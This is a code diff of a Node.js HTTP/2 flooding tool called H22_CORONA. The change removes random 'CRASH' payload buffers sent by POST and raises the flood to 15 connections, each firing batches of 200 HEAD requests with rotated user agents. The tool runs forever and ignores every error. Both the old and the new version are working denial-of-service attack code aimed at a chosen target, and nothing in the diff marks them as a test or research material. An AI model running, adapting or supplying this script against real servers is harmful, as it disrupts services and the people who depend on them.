@@ -12,15 +12,6 @@ class H22_CORONA {
         this.lastLog = Date.now();
         this.lastStatus = 200;
         
-        // CRASH payloads
-        this.CRASH_PAYLOADS = [
-            Buffer.alloc(65535, 'A'),
-            Buffer.alloc(8192, 'X'),
-            Buffer.alloc(16384, 'Z'.repeat(16384)),
-            Buffer.from(Array.from({length: 10000}, () => Math.floor(Math.random() * 256))),
-            Buffer.alloc(50000, '\x00')
-        ];
-        
         // Color codes
         this.colors = {
             reset: '\x1b[0m',
@@ -31,10 +22,10 @@ class H22_CORONA {
             yellow: '\x1b[93m'
         };
         
-        // Create 10x HTTP/2 connections
-        this.connections = this.createConnections(10);
+        // Create 15x HTTP/2 connections
+        this.connections = this.createConnections(15);
         
-        // Start attack cycle with restart logic
+        // Start attack cycle
         this.startAttack();
     }
 
@@ -44,8 +35,7 @@ class H22_CORONA {
             try {
                 const client = http2.connect(this.target, {
                     maxSessionMemory: 2048 * 2048,
-                    maxDeflateDynamicTableSize: 8192,
-                    maxSendHeaderBlockLength: 65536
+                    maxDeflateDynamicTableSize: 8192
                 });
                 
                 client.on('error', () => {});
@@ -60,12 +50,12 @@ class H22_CORONA {
             if (!this.running) return;
             
             try {
-                // Send CRASH payloads through each connection
+                // Send requests through each connection
                 for (const client of this.connections) {
                     if (client && !client.destroyed) {
-                        // Send 150 requests per connection per batch
-                        for (let i = 0; i < 150; i++) {
-                            this.sendCRASHRequest(client);
+                        // Send 200 requests per connection per batch
+                        for (let i = 0; i < 200; i++) {
+                            this.sendRequest(client);
                             this.totalReqs++;
                         }
                     }
@@ -76,15 +66,11 @@ class H22_CORONA {
                 if (now - this.lastLog >= 10000) {
                     this.lastLog = now;
                     this.logStatus();
-                    
-                    // Force garbage collection attempt
-                    if (global.gc) global.gc();
                 }
                 
                 // Immediate next batch
                 setImmediate(attackCycle);
             } catch (error) {
-                // Restart on any failure
                 setTimeout(() => {
                     this.restartConnections();
                     attackCycle();
@@ -95,18 +81,14 @@ class H22_CORONA {
         attackCycle();
     }
 
-    sendCRASHRequest(client) {
+    sendRequest(client) {
         try {
-            const payload = this.CRASH_PAYLOADS[Math.floor(Math.random() * this.CRASH_PAYLOADS.length)];
             const req = client.request({
-                ':method': 'POST',
-                ':path': '/' + Math.random().toString(36).substring(7),
+                ':method': 'HEAD',
+                ':path': '/',
                 ':authority': this.hostname,
-                'content-length': payload.length,
                 'user-agent': this.getRandomUA()
             });
-            
-            req.write(payload);
             
             req.on('response', (headers) => {
                 this.lastStatus = headers[':status'] || 200;
@@ -125,9 +107,7 @@ class H22_CORONA {
     getRandomUA() {
         const agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
         ];
         return agents[Math.floor(Math.random() * agents.length)];
     }
@@ -138,7 +118,7 @@ class H22_CORONA {
                 if (client && !client.destroyed) client.destroy();
             } catch (e) {}
         }
-        this.connections = this.createConnections(10);
+        this.connections = this.createConnections(15);
     }
 
     logStatus() {
@@ -168,7 +148,7 @@ class H22_CORONA {
     }
 }
 
-// Run forever with restart
+// Run forever
 if (require.main === module) {
     process.on('uncaughtException', () => {});
     process.on('unhandledRejection', () => {});
@@ -185,7 +165,6 @@ if (require.main === module) {
     const runForever = () => {
         const corona = new H22_CORONA(target);
         
-        // Auto-restart every 5 minutes
         setTimeout(() => {
             corona.stop();
             setTimeout(runForever, 1000);
@@ -198,4 +177,4 @@ if (require.main === module) {
         console.log('\nH22_CORONA stopped.');
         process.exit(0);
     });
-            }
+}
